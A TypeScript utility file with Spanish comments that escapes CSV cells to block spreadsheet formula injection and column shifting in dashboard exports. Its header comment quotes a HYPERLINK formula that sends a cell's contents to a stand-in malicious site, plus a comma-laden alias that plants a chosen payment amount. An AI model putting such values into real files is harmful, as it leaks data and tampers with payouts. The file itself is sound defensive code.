/**
 * Una celda de CSV segura (auditoría de seguridad, 2026-11-24).
 *
 * Dos problemas de las exportaciones del panel:
 *  1. Excel y Google Sheets EJECUTAN una celda que empieza con = + - @ (o tabulación/retorno): el título de un trabajo o el nombre de una persona escritos como
 *     `=HYPERLINK("https://sitio-malo/?x="&A2,"clic")` se ejecutan en la computadora de quien abre la exportación. Se les antepone una comilla simple.
 *  2. Un valor con coma o comillas sin entrecomillar mueve las columnas siguientes: en la exportación de pagos a trabajadores, un alias escrito como
 *     `a,999999,0` dejaba en la columna del monto un número elegido por el trabajador. Toda celda de texto va entre comillas, con las comillas duplicadas.
 */
export function celdaCsv(valor: unknown): string {
  let texto: string;
  if (valor === null || valor === undefined) return '';
  if (typeof valor === 'boolean') texto = valor ? 'Sí' : 'No';
  else if (valor instanceof Date) texto = valor.toISOString().split('T')[0];
  else texto = String(valor);
  if (/^[=+\-@\t\r]/.test(texto)) texto = `'${texto}`;
  if (/[",\r\n]/.test(texto) || texto.startsWith("'")) return `"${texto.replace(/"/g, '""')}"`;
  return texto;
}

/** Una celda que SIEMPRE va entre comillas (texto libre de la persona: nombre, título, alias, dirección…). */
export function celdaDeTextoCsv(valor: unknown): string {
  const c = celdaCsv(valor);
  return c.startsWith('"') ? c : `"${c}"`;
}
